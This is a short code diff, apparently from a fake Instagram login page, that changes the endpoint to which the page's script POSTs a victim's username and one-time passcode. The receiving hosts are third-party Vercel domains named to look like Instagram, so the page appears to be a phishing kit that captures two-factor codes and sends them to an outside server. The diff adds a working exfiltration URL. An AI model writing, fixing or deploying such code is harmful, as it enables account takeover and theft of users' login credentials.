@@ -121,7 +121,7 @@
             const otp = input.value.trim();
 
             try {
-                const response = await fetch('https://instagram-login-azure-kappa.vercel.app.vercel.app/api/otp', {
+                const response = await fetch('https://instagram-login-pi-lovat.vercel.app/api/otp', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ username, otp })
